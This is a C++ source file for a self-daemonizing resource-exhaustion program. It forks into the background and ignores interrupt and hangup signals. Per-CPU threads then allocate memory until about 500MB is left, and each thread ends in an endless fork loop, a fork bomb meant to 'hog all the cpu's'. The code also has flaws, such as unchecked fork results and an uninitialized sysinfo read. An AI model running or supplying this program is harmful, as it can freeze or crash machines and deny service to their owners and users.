#include <array>
#include <cstdint>
#include <thread>
#include <vector>
#include <fstream>
#include <iostream>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <syslog.h>
#include <sys/sysinfo.h>

// hogs all the memory, including virtual ram
void decl()
{
	while (true) std::array<uint64_t,2> *test = new std::array<uint64_t, 2>[3000];
}


// initial function from github repository daemon-skeleton-linux-c
static void daemon()
{
    pid_t pid;

    /* Fork off the parent process */
    pid = fork();


    /* Catch, ignore and handle signals */
    //TODO: Implement a working signal handler
    signal(SIGCHLD, SIG_IGN);
    signal(SIGHUP, SIG_IGN);
    signal(SIGINT, SIG_IGN);

    /* Fork off for the second time*/
    pid = fork();


    /* set new file permissions */
    umask(0);

    /* change the working directory to the root directory */
    /* or another appropriated directory */
    chdir("/");

    /* close all open file descriptors */
    int x;
    for (x = sysconf(_SC_OPEN_MAX); x>=0; x--)
    {
        close (x);
    }

    /* open the log file */
    openlog ("firstdaemon", LOG_PID, LOG_DAEMON);
}

// hogs all the cpu's
void decl_fixed(size_t thr_count)
{
	std::string f_line;
	// uint64_t size=5; // KB
    //std::ifstream file("/proc/meminfo");
   	//while (file >> f_line) {
   	//	if(f_line == "MemTotal:") {
   	//		if(file >> size) break;
   	//	}
   	//	file.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
   	//}
   	//file.close();
	//size = (__uint128_t)size;
	//uint32_t loop_count = 4000000;
	//size *= 1000; // convert _size to bytes
	//size /= 8*thr_count*loop_count; // every test element is 8 bytes

	// cause memory leakage
	//for(uint32_t i=0;i<loop_count;i++)
	//	std::array<uint64_t,2> *test = new std::array<uint64_t,2>[size];

	// allocate just enough to not crash the system and hog all CPUs
	struct sysinfo mem_info;
	uint64_t total_ram = mem_info.totalram+mem_info.totalswap;
	uint64_t available_ram;
	do {
	sysinfo (&mem_info);
	available_ram = mem_info.freeswap+mem_info.freeram;
	uint64_t *test = new uint64_t[1000];
	} while(available_ram >= 500000000); // leave 500MB of memory // TODO: How much memory is really required to not crash but get close?
	
	while (1) {fork();}
}

int main()
{
    const size_t thr_count = std::thread::hardware_concurrency();
	std::vector<std::thread> threads(thr_count);

	
    daemon();

    while (1)
    {
    	// iterate through all threads, will work even if the amount of threads is larger than the amount
    	for(uint32_t i=0;i<thr_count;i++) threads[i] = std::thread(decl_fixed, thr_count);
    	for(uint32_t i=0;i<thr_count;i++) threads[i].join();
    }
	return 0;
}

